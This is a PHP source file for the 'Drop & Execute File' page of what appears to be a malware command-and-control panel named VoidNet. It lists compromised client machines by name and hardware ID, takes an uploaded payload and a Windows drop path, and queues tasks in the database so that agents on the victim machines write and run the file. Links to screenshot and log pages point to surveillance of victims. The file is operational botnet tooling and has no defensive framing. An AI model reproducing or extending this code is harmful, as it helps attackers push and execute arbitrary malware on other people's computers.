<?php
require_once __DIR__ . '/../includes/auth.php';
require_once __DIR__ . '/../includes/db.php';

$message = '';
$message_type = '';

// Handle form
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['client_ids'])) {
    $client_ids = $_POST['client_ids'];
    $drop_location = $_POST['drop_location'];

    if (empty($client_ids) || empty($drop_location) || !isset($_FILES['file_to_drop']) || $_FILES['file_to_drop']['error'] != UPLOAD_ERR_OK) {
        $message = 'Error: Please select at least one client, specify a drop path, and upload a file.';
        $message_type = 'error';
    } else {
        $uploadDir = __DIR__ . '/../uploads/';
        $filename = time() . '_' . basename($_FILES['file_to_drop']['name']);
        $destination = $uploadDir . $filename;

        if (move_uploaded_file($_FILES['file_to_drop']['tmp_name'], $destination)) {
            $file_url = 'uploads/' . $filename;
            $stmt = $mysqli->prepare("INSERT INTO tasks (client_id, file_url, drop_location, status) VALUES (?, ?, ?, 'pending')");
            foreach ($client_ids as $client_id) {
                $stmt->bind_param('iss', $client_id, $file_url, $drop_location);
                $stmt->execute();
            }
            $stmt->close();
            $message = 'Task created successfully for ' . count($client_ids) . ' client(s).';
            $message_type = 'success';
        } else {
            $message = 'Error: Failed to move uploaded file. Check permissions on the uploads directory.';
            $message_type = 'error';
        }
    }
}

$clients_result = $mysqli->query("SELECT id, machine_name, client_hwid FROM clients ORDER BY machine_name");
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Drop File - VoidNet</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
      color: #e0e0e0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
    }

    .sidebar {
      background: linear-gradient(180deg, #242424 0%, #1e1e1e 100%);
      width: 250px;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      border-right: 1px solid #3a3a3a;
      box-shadow: 2px 0 10px rgba(0, 0, 0, 0.3);
    }

    .sidebar-header {
      padding: 25px 20px;
      border-bottom: 1px solid #3a3a3a;
      background: #1e1e1e;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .sidebar-header img {
      width: 32px;
      height: 32px;
      margin-right: 10px;
      filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.1));
    }

    .sidebar-header h1 {
      color: #ffffff;
      font-size: 20px;
      font-weight: 600;
    }

    .sidebar-nav {
      padding: 20px 0;
    }

    .sidebar-nav a {
      display: flex;
      align-items: center;
      padding: 14px 20px;
      color: #ccc;
      text-decoration: none;
      transition: all 0.3s ease;
      border-left: 3px solid transparent;
      font-size: 14px;
      font-weight: 500;
    }

    .sidebar-nav a:hover {
      background: rgba(255, 255, 255, 0.05);
      color: #ffffff;
      border-left-color: #666;
    }

    .sidebar-nav a.active {
      background: rgba(255, 255, 255, 0.1);
      color: #ffffff;
      border-left-color: #888;
      font-weight: 600;
    }

    .sidebar-footer {
      position: absolute;
      bottom: 0;
      width: 100%;
      padding: 20px;
      border-top: 1px solid #3a3a3a;
      background: #1e1e1e;
    }

    .sidebar-footer a {
      display: block;
      color: #ff6b6b;
      text-decoration: none;
      font-weight: 600;
      text-align: center;
      padding: 10px;
      border-radius: 6px;
      transition: all 0.3s ease;
      font-size: 14px;
    }

    .sidebar-footer a:hover {
      background: rgba(255, 107, 107, 0.1);
      color: #ff8a8a;
    }

    .main-content {
      margin-left: 250px;
      padding: 30px;
      min-height: 100vh;
    }

    .page-header {
      margin-bottom: 30px;
      padding-bottom: 15px;
      border-bottom: 2px solid #3a3a3a;
    }

    .page-header h1 {
      color: #ffffff;
      font-size: 28px;
      font-weight: 600;
    }

    .panel {
      background: linear-gradient(135deg, #2a2a2a 0%, #1e1e1e 100%);
      border-radius: 10px;
      border: 1px solid #3a3a3a;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
      margin-top: 30px;
    }

    .panel-header {
      background: linear-gradient(135deg, #1e1e1e 0%, #141414 100%);
      padding: 20px 25px;
      border-bottom: 1px solid #3a3a3a;
    }

    .panel-title {
      margin: 0;
      color: #ffffff;
      font-size: 18px;
      font-weight: 600;
    }

    .panel-body {
      padding: 25px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 500;
      color: #ccc;
    }

    input[type="text"],
    select,
    input[type="file"] {
      width: 100%;
      padding: 10px;
      background-color: #2a2a2a;
      color: #fff;
      border: 1px solid #444;
      border-radius: 6px;
    }

    select {
      height: 160px;
    }

    button {
      padding: 12px 25px;
      background-color: #444;
      color: #fff;
      border: 1px solid #666;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    button:hover {
      background-color: #555;
    }

    .message {
      padding: 15px;
      border-radius: 6px;
      margin-bottom: 20px;
      font-weight: 500;
    }

    .message.success {
      background-color: #264d26;
      color: #b6f7b6;
    }

    .message.error {
      background-color: #4d1e1e;
      color: #f7b6b6;
    }

    small {
      display: block;
      margin-top: 5px;
      color: #777;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <aside class="sidebar">
    <div class="sidebar-header">
      <img src="../assets/image/logo.png" alt="VoidNet">
      <h1>VoidNet</h1>
    </div>
    <nav class="sidebar-nav">
      <a href="dashboard.php">Dashboard</a>
      <a href="clients.php">Clients</a>
      <a href="drop.php" class="active">Drop File</a>
      <a href="screenshots.php">Screenshots</a>
      <a href="logs.php">Logs</a>
    </nav>
    <div class="sidebar-footer">
      <a href="../logout.php">Log Out</a>
    </div>
  </aside>

  <main class="main-content">
    <div class="page-header">
      <h1>Drop & Execute File</h1>
    </div>

    <div class="panel">
      <div class="panel-header">
        <h2 class="panel-title">Create New Task</h2>
      </div>
      <div class="panel-body">
        <?php if ($message): ?>
          <div class="message <?php echo $message_type; ?>"><?php echo $message; ?></div>
        <?php endif; ?>
        <form action="drop.php" method="POST" enctype="multipart/form-data">
          <div class="form-group">
            <label>1. Select Target Client(s)</label>
            <select name="client_ids[]" multiple required>
              <?php while($c = $clients_result->fetch_assoc()): ?>
              <option value="<?php echo $c['id']; ?>">
                <?php echo htmlspecialchars($c['machine_name']) . ' (' . htmlspecialchars($c['client_hwid']) . ')'; ?>
              </option>
              <?php endwhile; ?>
            </select>
            <small>Hold Ctrl (or Cmd on Mac) to select multiple clients.</small>
          </div>
          <div class="form-group">
            <label>2. Choose File to Drop</label>
            <input type="file" name="file_to_drop" required>
          </div>
          <div class="form-group">
            <label>3. Specify Drop Directory Path</label>
            <input type="text" name="drop_location" placeholder="e.g., C:\Users\Public\Documents\" required>
            <small>The agent will drop the file with its original name in this directory.</small>
          </div>
          <button type="submit">Create Task</button>
        </form>
      </div>
    </div>
  </main>
</body>
</html>
